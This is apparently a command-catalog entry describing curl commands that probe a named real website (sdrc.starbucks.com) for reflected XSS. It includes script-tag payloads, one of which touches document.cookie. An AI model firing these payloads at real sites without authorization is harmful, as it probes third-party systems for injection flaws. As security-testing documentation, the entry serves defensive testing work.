---
data: 'curl "https://sdrc.starbucks.com/search?q=<script>alert(''XSS'')</script>" -v'
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 5c2c6690-bc51-4068-9934-a7645d36dd0f
created_at: '2025-12-14T17:25:18.336Z'
updated_at: '2025-12-14T17:25:18.336Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss

## Command

```bash
curl "https://sdrc.starbucks.com/search?q=<script>alert('XSS')</script>" -v
```

## Description

This command tests for reflected XSS by sending a URL-encoded payload via curl to a vulnerable parameter on the target site, helping confirm if input is reflected unsanitized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL` | Target endpoint with payload in query param | Yes |
| `-v` | Verbose output to inspect headers and response | No |
| `q=<script>alert('XSS')</script>` | XSS test payload (URL-encode if needed) | Yes |

## Examples

### Basic Usage

```bash
curl "https://sdrc.starbucks.com/search?q=<script>alert('XSS')</script>" -v
```

### Advanced Usage

```bash
curl -X POST "https://sdrc.starbucks.com/form" -d "input=<script>alert(document.cookie)</script>" -v
```

## Expected Output

HTTP response showing the payload reflected in the body without escaping, e.g., the <script> tag appears as-is, indicating potential XSS.

## Related

- [[Related Procedure: Test-for-XSS-Vulnerability]]
